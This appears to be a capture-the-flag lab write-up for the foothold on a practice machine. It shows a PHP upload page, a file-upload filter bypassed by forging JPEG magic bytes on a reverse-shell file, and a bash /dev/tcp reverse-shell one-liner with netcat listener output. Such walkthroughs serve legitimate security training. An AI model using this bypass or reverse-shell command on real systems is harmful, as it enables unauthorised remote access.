# Foothold

## Checking procedure
- We can upload files in http://10.10.10.146/upload.php. The input is sanitized, and can upload images
![[Pasted image 20210425090739.png]]
- We can check the filename that has been uploaded from the `photos.php` page.
![[Pasted image 20210425090911.png]]
- From the source code, we can see that the files are stored in /uploads
```php
cat upload.php                                                                                        127 ↵ 
<?php                                                                                                           
require '/var/www/html/lib.php';                                                                                
                                                                                                                
define("UPLOAD_DIR", "/var/www/html/uploads/");                                                                 
                                                                                                                
if( isset($_POST['submit']) ) {                                                                                 
  if (!empty($_FILES["myFile"])) {                                                                              
    $myFile = $_FILES["myFile"];                                                                                
                                                                                                                
```
- We can check this by accessing the uploads directory with the file name from photos.php

## Getting reverse shell
- We can upload a reverse shell, and change the magic bytes of the file to jpg : `FF D8 FF DB` using any hex editor.
![[Pasted image 20210425091144.png]]
- Upload this file and access it through the /uploads directory
![[Pasted image 20210425091243.png]]
- We can check RCE
![[Pasted image 20210425091314.png]]
- Get a reverse shell using any payload. I used: `bash -c 'bash -i >& /dev/tcp/10.10.14.18/9001 0>&1'`
```bash
nc -lnvp 9001                                                                                           1 ↵ 
listening on [any] 9001 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.146] 34312
bash: no job control in this shell
bash-4.2$ ls

```
